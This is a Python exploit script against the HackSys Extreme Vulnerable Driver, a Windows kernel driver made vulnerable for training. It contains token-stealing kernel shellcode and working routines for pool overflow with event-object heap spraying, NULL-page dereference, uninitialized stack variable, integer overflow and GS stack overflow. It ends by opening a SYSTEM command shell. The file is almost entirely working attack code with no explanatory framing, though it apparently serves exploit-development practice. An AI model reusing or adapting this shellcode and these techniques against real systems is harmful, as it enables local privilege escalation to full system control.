import struct
import sys
import os

from ctypes import *
from ctypes.wintypes import *

DEVICE_NAME   = u"\\\\.\\HacksysExtremeVulnerableDriver"
GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x3
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
MEM_RELEASE = 0x8000
MEM_DECOMMIT = 0x4000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0


ntdll    = windll.ntdll
kernel32 = windll.kernel32

token_steal = ("\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b"
               "\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00"
               "\x00\x04\x75\xec\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00"
               "\x00")

def int2uint(i):
    return (i + (1 << 32)) & ((1 << 32) - 1)

def getLastError():
    """Format GetLastError"""
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(0x00001000, 0,
                                kernel32.GetLastError(), 0,
                                buf, sizeof(buf), 0):
        return buf.value, 
    else:
        return "Unknown Error"

def ioctl(n, data_in='', data_in_size=None, data_out_size=1024):
    if data_in_size == None:
        data_in_size = len(data_in)

    dwReturn = c_ulong()
    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, None, OPEN_EXISTING, 0, None)
    if not driver_handle or driver_handle == -1:
        sys.exit()

    print "[+] IOCTL: %s" % hex(n)
    output = create_string_buffer("\x00"*data_out_size, data_out_size)
    dev_ioctl = kernel32.DeviceIoControl(driver_handle, n,
                                         addressof(create_string_buffer(data_in)), data_in_size,
                                         addressof(output), data_out_size,
                                         byref(dwReturn), None)
    return output

def trigger_pool(data):
    ioctl(0x22200f, data)

def spray():
    print '[.] Spraying 20000 event objects.'
    kernel32.CreateEventW.argtypes = (LPVOID, BOOL, BOOL, LPCWSTR)

    for i in xrange(15000):
        kernel32.CreateEventW(c_void_p(), 0, 0, "")
  
    l = []
    for i in xrange(5000):
        h = kernel32.CreateEventW(c_void_p(), 0, 0, "")
        #print hex(h)
        l.append(h)
    
    return l

def poke(l):
    print '[.] Poking holes.'
    for i in xrange(0, 5000, 0x400/0x40):
        for j in xrange(0x200/0x40):
            kernel32.CloseHandle(l[i + j])

def mmap(addr=0, size=0x1000):
    addr = c_uint(addr)
    size = c_uint(size)

    ntdll.NtAllocateVirtualMemory.argtypes = \
            [c_int, POINTER(c_uint), c_ulong, POINTER(c_uint), c_uint, c_uint]
    ret = ntdll.NtAllocateVirtualMemory(kernel32.GetCurrentProcess(), 
                                        byref(addr), 
                                        0, 
                                        byref(size), 
                                        MEM_RESERVE|MEM_COMMIT, 
                                        PAGE_EXECUTE_READWRITE)

    if ret != STATUS_SUCCESS:
        print '[!] Error (%#x) mapping page.' % int2uint(ret)
        sys.exit()
    print '[.] Mapped %d page(s) at %#x' \
                    % ((size.value + 0xfff) / 0x1000, addr.value)
    return addr.value

def munmap(addr, size=0x1000):
    addr = c_uint(addr)
    size = c_uint(size)

    ntdll.NtFreeVirtualMemory.argtypes = \
                            [c_int, POINTER(c_uint), POINTER(c_uint), c_uint]
    ret = ntdll.NtFreeVirtualMemory(kernel32.GetCurrentProcess(), byref(addr), 
                                    byref(size), MEM_RELEASE)

    if ret != STATUS_SUCCESS:
        print '[!] Error (%#x) unmapping.' % int2uint(ret)
        sys.exit()
    print '[.] Unmapped %d page(s) at %#x' \
                                % ((size.value + 0xfff) / 0x1000, addr.value)
    return addr.value

def write(addr, data):
    bytes_written = c_uint()
    kernel32.WriteProcessMemory.argtypes = \
                        [c_int, c_void_p, c_char_p, c_uint, POINTER(c_uint)]
    ret = kernel32.WriteProcessMemory(
                            kernel32.GetCurrentProcess(), c_void_p(addr), 
                            data, c_uint(len(data)), byref(bytes_written))
    
    if ret == 0:
        print '[!] Error WriteProcessMemory: %s' % getLastError()
        sys.exit()
    print '[.] Wrote %d/%d bytes to %#x' \
                    % (bytes_written.value, len(data), addr)
    return bytes_written.value

def pool_overflow():
    sc = struct.pack("<I", 0x78) + token_steal + '\xc2\x10\x00'
    mmap(4)
    write(0x74, sc)

    l = spray()
    poke(l)

    headers = struct.pack("<IIIIIIIIIb", 0x04080040, 0xee657645, 0x00000000, 
                          0x00000040, 0x00000000, 0x00000000, 0x00000001, 
                          0x00000001, 0x00000000, 0)
    trigger_pool("\x41"*0x1f8 + headers)
    #raw_input('bp hevd+420b')
    for i in xrange(5000):
        kernel32.CloseHandle(l[i])

def trigger_null_deref(data=struct.pack("<I", 0xBAD0B0B0)):
    ioctl(0x22202b, data)

def null_deref():
    sc = struct.pack("<I", 0x8) + token_steal + '\xc3'
    mmap(4)
    write(0x4, sc)

    #raw_input('bp hevd+4cf4')
    trigger_null_deref('')

def uninitialized_stack_var():
    # can't call ioctl() because it will mess up stack
    # calling DeviceIOControl() right after NtMapUserPhysicalPages()
    # don't even call print
    dwReturn      = c_ulong()
    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, None, OPEN_EXISTING, 0, None)
    if not driver_handle or driver_handle == -1:
        sys.exit()

    sc = token_steal + '\xc3'
    m = mmap()
    write(m, sc)
    c_ulong_array = c_ulong * 1024
    b = c_ulong_array(*([m]*1024))
    # bp nt!NtMapUserPhysicalPages
    # bp hevd+4f8c
    ntdll.NtMapUserPhysicalPages.argtypes = \
                                    (c_void_p, c_ulong, POINTER(c_ulong_array))
    ntdll.NtMapUserPhysicalPages(0, 1024, byref(b))

    #print "[+] IOCTL: 0x22202f"
    dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x22202f,
                                         addressof(create_string_buffer('')), 0,
                                         addressof(create_string_buffer('')), 0,
                                         byref(dwReturn), None)

def trigger_int_overflow(data, size):
    ioctl(0x222027, data, size)

def int_overflow():
    sc = token_steal + '\x5d\xc2\x08\x00'
    m = mmap()
    write(m, sc)
    #raw_input('.')

    # overwrite EIP with m
    trigger_int_overflow(
            "A"*0x828 + struct.pack("<I", m) + struct.pack("<I", 0xBAD0B0B0),
            0xffffffff)

def trigger_stackoverflow_gs(addr, size):
    dwReturn = c_ulong()
    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, None, OPEN_EXISTING, 0, None)
    if not driver_handle or driver_handle == -1:
        sys.exit()

    print "[+] IOCTL: 0x222007"
    dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x222007,
                                         addr, size,
                                         None, 0,
                                         byref(dwReturn), None)

def stackoverflow_gs():
    m = mmap(size=0x2000)
    munmap(m+0x1000)
    size = 0x210+4

    sc = token_steal
    sc += ('\x8b\xbc\x24\x8c\x07\x00\x00\x8b\xb4\x24\x90\x07\x00\x00\x8b\x9c'
           '\x24\x94\x07\x00\x00\x81\xc4\xb8\x09\x00\x00\x5d\xc2\x08\x00')
    write(m, sc + 'A'*(0x1000-4-len(sc)) + struct.pack("<I", m))
    trigger_stackoverflow_gs(m+0x1000-size, size+1)

#pool_overflow()
#null_deref()
#uninitialized_stack_var()
#int_overflow()
stackoverflow_gs()

print '\n[+] Privilege Escalated\n'
os.system('cmd.exe')
